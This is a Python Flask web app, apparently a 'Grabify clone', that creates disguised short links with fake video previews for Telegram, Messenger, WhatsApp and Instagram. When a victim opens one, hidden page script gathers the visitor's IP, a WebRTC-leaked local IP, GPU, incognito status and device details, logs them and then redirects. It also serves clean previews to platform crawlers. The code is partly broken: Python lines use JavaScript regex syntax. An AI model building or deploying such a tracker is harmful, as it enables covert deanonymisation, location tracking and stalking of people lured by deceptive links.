from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import pytz
import re
from functools import wraps
from user_agents import parse

app = Flask(__name__)

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

ALGIERS_TZ = pytz.timezone('Africa/Algiers')

def get_gmt1_time():
    return datetime.datetime.now(ALGIERS_TZ).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                target_platform TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                local_ip TEXT,
                device TEXT,
                device_model TEXT,
                time TEXT,
                language TEXT,
                screen_size TEXT,
                gpu TEXT,
                incognito TEXT,
                touch_points TEXT,
                referrer TEXT,
                FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
            )
        ''')
        conn.commit()

init_db()

def guess_device_by_hardware(ua_string, gpu, touch_points):
    gpu_upper = gpu.upper()
    ua_upper = ua_string.upper()
    
    if "IPHONE" in ua_upper or "MACINTOSH" in ua_upper:
        if "APPLE" in gpu_upper or "METAL" in gpu_upper:
            if "5" in str(touch_points): return "Apple iPhone (Advanced iOS Client)"
            return "Apple Device (iPad/Mac)"

    if "MALI-G710" in gpu_upper:
        return "Android Flagship (e.g., Redmi Note 12 Pro / Galaxy A54)"
    elif "MALI-G57" in gpu_upper:
        return "Android Device (e.g., Realme C11 / Infinix / Tecno)"
    elif "ADRENO (TM) 610" in gpu_upper or "ADRENO 610" in gpu_upper:
        return "Android Device (e.g., Xiaomi Redmi 9 / Oppo A53)"
    elif "ADRENO (TM) 730" in gpu_upper or "ADRENO 730" in gpu_upper:
        return "Android Premium Flagship (e.g., Samsung S22 Ultra / Xiaomi 12 Pro)"
    elif "POWERVR" in gpu_upper or "GE8320" in gpu_upper:
        return "Android Device (e.g., Samsung A03s / Realme C21)"
        
    if "ANDROID" in ua_upper:
        return "Generic Android Smartphone"
        
    return "Unknown Hardware Client"

def fetch_original_meta(url, manual_thumb_url=None):
    url_lower = url.lower()
    title = "Watch Trending Video Content in HD Quality"
    img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
    
    # 1. إذا قام المستخدم بإدخال رابط صورة يدوياً (للمنصات الصعبة مثل فيسبوك وتيك توك وإنستغرام)
    if manual_thumb_url and manual_thumb_url.strip():
        img_final = manual_thumb_url.strip()
        if img_final.startswith('http://'):
            img_final = img_final.replace('http://', 'https://')
            
        if "instagram.com" in url_lower:
            title = "Instagram Post Media Player"
        elif "facebook.com" in url_lower or "fb.watch" in url_lower:
            title = "Facebook Video Player HD"
        elif "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
            title = "TikTok Video Content Player"
        return title, img_final
        
    # 2. معالجة روابط يوتيوب تلقائياً (توليد الصورة المصغرة عبر الـ Video ID مباشرة)
    if "youtube.com" in url_lower or "youtu.be" in url_lower:
        title = "YouTube Video Stream Player HD"
        video_id = None
        
        # استخراج المعرف من روابط youtu.be/XXXX
        if "youtu.be/" in url_lower:
            parts = url.split("youtu.be/")
            if len(parts) > 1:
                video_id = parts[1].split(/[?#]/)[0]
        # استخراج المعرف من روابط youtube.com/watch?v=XXXX
        elif "v=" in url_lower:
            match = re.search(r"[?&]v=([^&#]+)", url)
            if match:
                video_id = match.group(1)
        # استخراج المعرف من روابط الشورتس youtube.com/shorts/XXXX
        elif "shorts/" in url_lower:
            parts = url.split("shorts/")
            if len(parts) > 1:
                video_id = parts[1].split(/[?#]/)[0]
                
        if video_id:
            img = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg"
        return title, img

    # 3. معالجة روابط خرائط قوقل تلقائياً
    if "goo.gl/maps" in url_lower or "maps.google" in url_lower or "maps.app.goo.gl" in url_lower:
        title = "Google Maps - Realtime Location Shared"
        img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
        return title, img
        
    return title, img

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response('Login Required.', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
        return f(*args, **kwargs)
    return decorated

DASHBOARD_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShortURL - Premium Link Shortener Service</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; color: #1e293b; margin: 0; padding: 0; }
        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
        .navbar a { color: #38bdf8; text-decoration: none; font-size: 14px; background: #1e293b; padding: 8px 15px; border-radius: 6px; border: 1px solid #334155; }
        .container { max-width: 800px; margin: 40px auto; padding: 20px; }
        .hero { text-align: center; margin-bottom: 40px; }
        .hero h1 { font-size: 32px; color: #0f172a; margin-bottom: 10px; }
        .create-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
        .section-title { font-size: 14px; text-transform: uppercase; color: #64748b; margin-bottom: 15px; font-weight: bold; }
        .platform-tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab-btn { padding: 10px 16px; border: 1px solid #cbd5e1; background: #fff; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; }
        .tab-btn.active[data-target="Telegram"] { background: #0088cc; color: white; }
        .tab-btn.active[data-target="Messenger"] { background: #0084FF; color: white; }
        .tab-btn.active[data-target="WhatsApp"] { background: #25D366; color: white; }
        .tab-btn.active[data-target="Instagram"] { background: #E1306C; color: white; }
        label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; }
        input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; background: #f8fafc; }
        .conditional-thumbnail { display: none; background: #f1f5f9; padding: 15px; border-radius: 8px; margin-top: 15px; border: 1px solid #cbd5e1; }
        .helper-btn { display: inline-block; background: #0f172a; color: white; text-decoration: none; padding: 8px 14px; font-size: 13px; border-radius: 4px; margin-top: 8px; font-weight: bold; }
        .helper-btn:hover { background: #334155; }
        .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="navbar">
        <span>🔗 ShortURL Admin</span>
        <a href="/my-links">📁 My Links Dashboard</a>
    </div>
    <div class="container">
        <div class="hero">
            <h1>Create Shortened URL</h1>
            <p>Optimize, configure and smart-target your web links effortlessly</p>
        </div>
        <div class="create-box">
            <form action="/create" method="POST">
                <div class="section-title">1. Target Delivery Platform</div>
                <div class="platform-tabs">
                    <button type="button" class="tab-btn active" data-target="Telegram" onclick="setTarget('Telegram')">Telegram</button>
                    <button type="button" class="tab-btn" data-target="Messenger" onclick="setTarget('Messenger')">Facebook Messenger</button>
                    <button type="button" class="tab-btn" data-target="WhatsApp" onclick="setTarget('WhatsApp')">WhatsApp Chat</button>
                    <button type="button" class="tab-btn" data-target="Instagram" onclick="setTarget('Instagram')">Instagram DM</button>
                </div>
                <input type="hidden" id="target_platform" name="target_platform" value="Telegram">

                <label>Destination Long URL:</label>
                <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                
                <div id="thumbnail_wrapper" class="conditional-thumbnail">
                    <b id="meta_warning_title" style="color:#0f172a; font-size:13px;">⚠️ Meta Link Detected:</b>
                    <p style="margin: 5px 0; font-size:12px; color:#475569;">لضمان ظهور الصورة المصغرة بشكل مستقر، يرجى استخراج الرابط يدوياً عبر الموقع ولصقه في الحقل:</p>
                    
                    <a id="extractor_link" href="#" target="_blank" class="helper-btn">🔗 اضغط هنا لاستخراج رابط الصورة</a>
                    
                    <label style="margin-top:10px;">قم بلصق رابط الصورة المستخرجة هنا (Image URL):</label>
                    <input type="url" name="manual_thumbnail" id="manual_thumbnail" placeholder="https://...">
                </div>

                <label>Admin Description / Note:</label>
                <input type="text" name="note" placeholder="e.g. Meta target asset tracking" required>
                
                <button type="submit" class="submit-btn">Generate Encrypted Short URL</button>
            </form>
        </div>
    </div>
    <script>
        function setTarget(platform) {
            document.getElementById('target_platform').value = platform;
            var buttons = document.querySelectorAll('.tab-btn');
            buttons.forEach(btn => btn.classList.remove('active'));
            document.querySelector(`[data-target="${platform}"]`).classList.add('active');
        }
        function checkUrlDomain(val) {
            var thumbWrapper = document.getElementById('thumbnail_wrapper');
            var extractorLink = document.getElementById('extractor_link');
            var warningTitle = document.getElementById('meta_warning_title');
            var manualInput = document.getElementById('manual_thumbnail');
            var low = val.toLowerCase();
            
            if (low.includes("instagram.com")) {
                thumbWrapper.style.display = "block";
                warningTitle.innerText = "⚠️ Instagram Link Detected:";
                extractorLink.href = "https://thumbnail-downloader.com/instagram";
                manualInput.required = true;
            } else if (low.includes("facebook.com") || low.includes("fb.watch")) {
                thumbWrapper.style.display = "block";
                warningTitle.innerText = "⚠️ Facebook Link Detected:";
                extractorLink.href = "https://thumbnail-downloader.com/Facebook";
                manualInput.required = true;
            } else if (low.includes("tiktok.com") || low.includes("vt.tiktok")) {
                thumbWrapper.style.display = "block";
                warningTitle.innerText = "⚠️ TikTok Link Detected (Cloud Upload Active):";
                extractorLink.href = "https://thumbnail-downloader.com/tiktok";
                manualInput.required = true;
            } else {
                thumbWrapper.style.display = "none";
                manualInput.required = false;
            }
        }
    </script>
</body>
</html>
'''

MY_LINKS_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Links Vault</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f8fafc; margin: 0; padding: 0; }
        .navbar { background-color: #0f172a; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
        .navbar a { color: white; text-decoration: none; font-size: 14px; background: #3b82f6; padding: 8px 15px; border-radius: 6px; }
        .container { max-width: 1200px; margin: 30px auto; padding: 20px; }
        .table-wrapper { background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); overflow-x: auto; border: 1px solid #e2e8f0; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
        .main-table th, .main-table td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; vertical-align: middle; }
        .main-table th { background-color: #0f172a; color: white; }
        .badge { background: #ef4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; }
        .btn-action { padding: 6px 12px; font-size: 12px; font-weight: bold; border-radius: 4px; text-decoration: none; color: white; }
        .btn-view { background-color: #2563eb; }
        .btn-del { background-color: #dc2626; margin-left: 5px; }
        .thumb-preview { width: 80px; height: 50px; border-radius: 4px; object-fit: cover; border: 1px solid #cbd5e1; background: #f1f5f9; display: block; }
    </style>
</head>
<body>
    <div class="navbar">
        <span>📁 My Generated Links</span>
        <a href="/">+ Shorten New URL</a>
    </div>
    <div class="container">
        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>Preview Image</th> <th>Description / Note</th>
                        <th>Target Platform</th>
                        <th>Fetched Title</th>
                        <th>Total Clicks</th>
                        <th>Shortened Link</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for link in links_list %}
                    <tr>
                        <td><img src="{{ link.custom_image }}" class="thumb-preview"></td>
                        <td style="font-weight: 600;">{{ link.note }}</td>
                        <td>{{ link.target_platform }}</td>
                        <td>{{ link.video_title }}</td>
                        <td><span class="badge">{{ link.clicks_count }}</span></td>
                        <td><a href="/secure/{{ link.id }}" target="_blank">secure/{{ link.id }}</a></td>
                        <td>
                            <a href="/analytics/{{ link.id }}" class="btn-action btn-view">📊 Advanced Logs</a>
                            <a href="/delete/{{ link.id }}" class="btn-action btn-del" onclick="return confirm('Delete?');">🗑️</a>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
'''

ANALYTICS_LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Grabify-Style Premium Analytics</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #f4f6f9; margin: 0; padding: 0; color: #333; }
        .navbar { background-color: #0f172a; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
        .navbar a { color: white; text-decoration: none; background: #475569; padding: 8px 12px; border-radius: 4px; font-size: 13px; font-weight: bold; }
        .container { max-width: 1200px; margin: 30px auto; padding: 0 15px; box-sizing: border-box; }
        h2 { font-size: 22px; color: #1e293b; margin-bottom: 20px; }
        
        .table-responsive { width: 100%; background: white; border-radius: 6px; overflow-x: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #d1d5db; }
        .grabify-table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 800px; table-layout: fixed; }
        .grabify-table th { background: #2c3e50; color: white; padding: 12px; text-align: left; font-weight: bold; }
        .grabify-table td { padding: 12px; border-bottom: 1px solid #e5e7eb; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; }
        .grabify-table tr:nth-child(even) { background: #f9fafb; }
        .bot-row { background: #fff7ed !important; }
        
        .badge-danger { background-color: #ef4444; color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 12px; display: inline-block; }
        .badge-bot { background: #ea580c; color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; display: inline-block; }
        .badge-user { background: #2563eb; color: white; padding: 3px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; display: inline-block; }
        
        .btn-more { background-color: #0088cc; color: white; border: none; padding: 6px 12px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-more:hover { background-color: #006699; }

        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        .modal-content { background: white; width: 100%; max-width: 550px; border-radius: 8px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.25); animation: fadeIn 0.3s ease-out; }
        .modal-header { background: #f8fafc; padding: 15px; font-weight: bold; font-size: 16px; border-bottom: 1px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center; color: #0f172a; }
        .modal-close { background: none; border: none; font-size: 20px; cursor: pointer; color: #94a3b8; font-weight: bold; }
        .modal-body { padding: 0; max-height: 80vh; overflow-y: auto; }
        
        .modal-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: left; }
        .modal-table tr { border-bottom: 1px solid #f1f5f9; }
        .modal-table tr:last-child { border-bottom: none; }
        .modal-table td { padding: 12px 16px; vertical-align: top; }
        .modal-table td:first-child { font-weight: bold; color: #475569; width: 40%; background-color: #f8fafc; }
        .modal-table td:last-child { color: #0f172a; word-break: break-all; white-space: normal; }
        
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
    </style>
</head>
<body>
    <div class="navbar">
        <span>📊 Grabify Clone Analytics Dashboard</span>
        <a href="/my-links">📁 Back Dashboard</a>
    </div>
    <div class="container">
        <h2>Results & Link Information Log</h2>
        
        <div class="table-responsive">
            <table class="grabify-table">
                <colgroup>
                    <col style="width: 20%;">
                    <col style="width: 25%;">
                    <col style="width: 25%;">
                    <col style="width: 18%;">
                    <col style="width: 12%;">
                </colgroup>
                <thead>
                    <tr>
                        <th>Date/Time</th>
                        <th>IP / Provider</th>
                        <th>Platform / Device</th>
                        <th>Referring URL</th>
                        <th>More Info</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not clicks_list %}
                    <tr><td colspan="5" style="text-align:center; color:#9ca3af; padding:30px;">No logs recorded yet. Awaiting interactions...</td></tr>
                    {% endif %}
                    
                    {% for click in clicks_list %}
                    <tr class="{% if 'Bot' in click.device_model or 'Crawler' in click.device_model %}bot-row{% endif %}">
                        <td><strong>{{ click.time }}</strong></td>
                        <td>
                            <span class="badge-danger">{{ click.ip }}</span><br>
                            <small style="font-weight:bold; color:#4b5563;">
                                {% if "Facebook" in click.device_model %}FACEBOOK, INC.
                                {% elif "Telegram" in click.device_model %}TELEGRAM MESSENGER LLP
                                {% elif "WhatsApp" in click.device_model %}WHATSAPP INC.
                                {% else %}ISP CLIENT NETWORK
                                {% endif %}
                            </small>
                        </td>
                        <td>
                            {% if "Bot" in click.device_model or "Crawler" in click.device_model %}
                            <span class="badge-bot">🤖 {{ click.device_model }}</span>
                            {% else %}
                            <span class="badge-user">📱 {{ click.device_model }}</span>
                            {% endif %}
                        </td>
                        <td style="color:#2563eb;">{{ click.referrer }}</td>
                        <td>
                            <button class="btn-more" onclick="openModal({{ loop.index0 }})">More Info</button>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>

    <div id="grabifyModal" class="modal-overlay" onclick="closeModal(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <div class="modal-header">
                <span>Advanced Log</span>
                <button class="modal-close" onclick="closeModal(true)">&times;</button>
            </div>
            <div class="modal-body">
                <table class="modal-table">
                    <tr><td>Date/Time</td><td id="m_time"></td></tr>
                    <tr><td>IP Address</td><td id="m_ip" style="color: #ef4444; font-weight: bold;"></td></tr>
                    <tr><td>Platform / Client</td><td id="m_client"></td></tr>
                    <tr><td>Local Network IP</td><td id="m_local_ip" style="color: #16a34a; font-weight: bold;"></td></tr>
                    <tr><td>Incognito Window</td><td id="m_incognito"></td></tr>
                    <tr><td>Screen Canvas Size</td><td id="m_screen"></td></tr>
                    <tr><td>Hardware GPU Engine</td><td id="m_gpu"></td></tr>
                    <tr><td>Browser Languages</td><td id="m_lang"></td></tr>
                    <tr><td>Touch Screen</td><td id="m_touch"></td></tr>
                    <tr><td>Referring URL</td><td id="m_referrer" style="color: #2563eb;"></td></tr>
                    <tr><td>Raw User Agent</td><td id="m_ua" style="font-family: monospace; font-size: 11px; color:#5b21b6; background: #f8fafc;"></td></tr>
                </table>
            </div>
        </div>
    </div>

    <script>
        var logsData = [
            {% for click in clicks_list %}
            {
                time: "{{ click.time }}",
                ip: "{{ click.ip }}",
                model: "{{ click.device_model }}",
                local_ip: "{{ click.local_ip }}",
                incognito: "{{ click.incognito }}",
                screen: "{{ click.screen_size }}",
                gpu: "{{ click.gpu }}",
                lang: "{{ click.language }}",
                touch: "{{ click.touch_points }}",
                referrer: "{{ click.referrer }}",
                ua: "{{ click.device | replace('"', '\\"') }}"
            }{% if not loop.last %},{% endif %}
            {% endfor %}
        ];

        function openModal(index) {
            var data = logsData[index];
            if(!data) return;
            
            document.getElementById('m_time').innerText = data.time;
            document.getElementById('m_ip').innerText = data.ip;
            document.getElementById('m_client').innerText = data.model;
            document.getElementById('m_local_ip').innerText = data.local_ip;
            document.getElementById('m_incognito').innerText = data.incognito;
            document.getElementById('m_screen').innerText = data.screen;
            document.getElementById('m_gpu').innerText = data.gpu;
            document.getElementById('m_lang').innerText = data.lang;
            document.getElementById('m_touch').innerText = data.touch;
            document.getElementById('m_referrer').innerText = data.referrer;
            document.getElementById('m_ua').innerText = data.ua;
            
            document.getElementById('grabifyModal').style.display = 'flex';
        }

        function closeModal(force) {
            document.getElementById('grabifyModal').style.display = 'none';
        }
    </script>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    return render_template_string(DASHBOARD_LAYOUT, host_url=request.host_url)

@app.route('/my-links')
@requires_auth
def my_links():
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('''
            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.target_platform, COUNT(c.id) as clicks_count 
            FROM links l LEFT JOIN clicks c ON l.id = c.link_id GROUP BY l.id ORDER BY l.id DESC
        ''')
        links_list = cursor.fetchall()
    return render_template_string(MY_LINKS_LAYOUT, links_list=links_list)

@app.route('/analytics/<link_id>')
@requires_auth
def analytics(link_id):
    is_new = request.args.get('new', '0') == '1'
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM links WHERE id = ?', (link_id,))
        link_info = cursor.fetchone()
        cursor.execute('SELECT * FROM clicks WHERE link_id = ? ORDER BY id DESC', (link_id,))
        clicks_list = cursor.fetchall()
    if not link_info:
        return "Link not found", 404
    return render_template_string(ANALYTICS_LAYOUT, link_info=link_info, clicks_list=clicks_list, is_new=is_new, host_url=request.host_url)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    manual_thumbnail = request.form.get('manual_thumbnail', '')
    note = request.form.get('note')
    target_platform = request.form.get('target_platform', 'Telegram')
    
    video_title, custom_image = fetch_original_meta(original_url, manual_thumbnail)
    link_id = str(uuid.uuid4())[:6].upper()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, original_url, note, video_title, custom_image, target_platform) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (link_id, original_url, note, video_title, custom_image, target_platform))
        conn.commit()
    
    return redirect(f'/analytics/{link_id}?new=1')

@app.route('/delete/<link_id>')
@requires_auth
def delete_link(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("PRAGMA foreign_keys = ON")
        cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
        conn.commit()
    return redirect('/my-links')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    ua_raw = request.headers.get('User-Agent', '')
    ua_lower = ua_raw.lower()
    
    bot_detected = None
    if "facebookexternalhit" in ua_lower or "facebookplatform" in ua_lower:
        bot_detected = "Facebook Crawler / Bot"
    elif "telegrambot" in ua_lower:
        bot_detected = "Telegram Bot Check"
    elif "whatsapp" in ua_lower:
        bot_detected = "WhatsApp Link Preview Bot"
    elif "twitterbot" in ua_lower:
        bot_detected = "Twitter/X Media Bot"
    elif "discordbot" in ua_lower:
        bot_detected = "Discord Embed Webhook"
    elif "googlebot" in ua_lower:
        bot_detected = "Google Search Index Crawler"
    elif any(b in ua_lower for b in ["slackbot", "bingbot", "bot", "crawler", "spider"]):
        bot_detected = "Generic Platform Bot / Crawler"
        
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        link_data = cursor.fetchone()
        
    if link_data:
        target = link_data['target_platform']
        title = link_data['video_title']
        image_url = link_data['custom_image']
        dest_url = link_data['original_url']
        
        if bot_detected:
            ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
            if ip_address and ',' in ip_address:
                ip_address = ip_address.split(',')[0].strip()
                
            current_time = get_gmt1_time()
            
            with sqlite3.connect(DB_FILE) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    link_id, ip_address, "N/A (Bot Entry)", ua_raw, bot_detected, current_time,
                    "N/A", "N/A (Platform Crawler)", "N/A", "Bot Link Scan/Preview", "No", "Platform Pre-fetch System"
                ))
                conn.commit()

            meta_tags = f'<meta property="og:type" content="video.other">'
            if target == "Telegram":
                meta_tags = f'''
                <meta property="og:type" content="video">
                <meta property="og:video" content="{dest_url}">
                <meta name="twitter:card" content="player">
                '''
            elif target == "Messenger":
                meta_tags = f'<meta property="og:type" content="video.movie">'
                
            return f'''
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>{title}</title>
                <meta http-equiv="refresh" content="3;url={dest_url}">
                <meta property="og:title" content="{title}">
                <meta property="og:description" content="▶ Click to watch full video content.">
                <meta property="og:image" content="{image_url}">
                <meta property="og:image:secure_url" content="{image_url}">
                <meta property="og:image:type" content="image/jpeg">
                <meta property="og:url" content="{request.base_url}">
                <meta name="twitter:card" content="summary_large_image">
                <meta name="twitter:title" content="{title}">
                <meta name="twitter:image" content="{image_url}">
                {meta_tags}
            </head>
            <body>Link Verification Processing...</body>
            </html>
            '''

        meta_tags = f'<meta property="og:type" content="video.other">'
        if target == "Telegram":
            meta_tags = f'''
            <meta property="og:type" content="video">
            <meta property="og:video" content="{dest_url}">
            <meta name="twitter:card" content="player">
            '''
        elif target == "Messenger":
            meta_tags = f'<meta property="og:type" content="video.movie">'

        return f'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="▶ Click to watch full video content.">
            <meta property="og:image" content="{image_url}">
            <meta property="og:image:secure_url" content="{image_url}">
            <meta property="og:url" content="{request.base_url}">
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:title" content="{title}">
            <meta name="twitter:image" content="{image_url}">
            
            {meta_tags}
            <script>
                function extractAdvancedMetrics() {{
                    var payload = {{
                        local_ip: "Encrypted (mDNS)",
                        language: navigator.language || "Unknown",
                        screen_size: window.screen.width + " x " + window.screen.height,
                        gpu: "Unknown GPU",
                        incognito: "Standard Browser",
                        touch_points: "0",
                        referrer: document.referrer || "Direct Visit"
                    }};

                    if(navigator.maxTouchPoints){{ payload.touch_points = navigator.maxTouchPoints; }}

                    try {{
                        var canvas = document.createElement("canvas");
                        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                        if(gl) {{
                            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                            if(debugInfo) {{ payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }}
                        }}
                    }} catch(e) {{}}

                    try {{
                        if (navigator.storage && navigator.storage.estimate) {{
                            navigator.storage.estimate().then(function(est) {{
                                if(est.quota < 120000000) {{ payload.incognito = "Incognito / Private Mode"; }}
                            }});
                        }}
                    }} catch(e) {{}}

                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (window.RTCPeerConnection) {{
                        var pc = new RTCPeerConnection({{ iceServers: [] }});
                        pc.createDataChannel("");
                        pc.onicecandidate = function(e) {{
                            if (!e || !e.candidate || !e.candidate.candidate) return;
                            var cand = e.candidate.candidate;
                            var match = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(cand);
                            if (match) {{ payload.local_ip = match[1]; }}
                        }};
                        pc.createOffer().then(function(sdp) {{ pc.setLocalDescription(sdp); }}).catch(function(e){{}});
                    }}

                    setTimeout(function() {{
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "/log-click/{link_id}", true);
                        xhr.setRequestHeader("Content-Type", "application/json");
                        xhr.onreadystatechange = function () {{
                            if (xhr.readyState === 4) {{ window.location.href = "{dest_url}"; }}
                        }};
                        xhr.send(JSON.stringify(payload));
                    }}, 950);
                }}
                window.onload = extractAdvancedMetrics;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
            <div>Connecting to secure application cluster infrastructure...</div>
        </body>
        </html>
        '''
    return "Link not found", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    data = request.get_json() or {}
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
        
    ua_string = request.headers.get('User-Agent', '')
    gpu_info = data.get('gpu', 'Unknown')
    touch_pts = data.get('touch_points', '0')
    
    device_model_final = "Unknown Client Hardware"
    try:
        user_agent = parse(ua_string)
        brand = user_agent.device.brand
        model = user_agent.device.model
        
        if brand and model and brand.lower() != "generic" and model.lower() != "smartphone":
            device_model_final = f"{brand} {model}"
        else:
            device_model_final = guess_device_by_hardware(ua_string, gpu_info, touch_pts)
    except:
        pass

    current_time = get_gmt1_time()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            link_id, ip_address, data.get('local_ip', 'Encrypted (mDNS)'), ua_string, device_model_final,
            current_time, data.get('language', 'fr-FR'), data.get('screen_size', 'Unknown'), gpu_info,
            data.get('incognito', 'Standard Browser'), f"Yes ({touch_pts} touch points)" if int(str(touch_pts)) > 0 else "No (0 touch points)",
            data.get('referrer', 'Direct Visit')
        ))
        conn.commit()
        
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
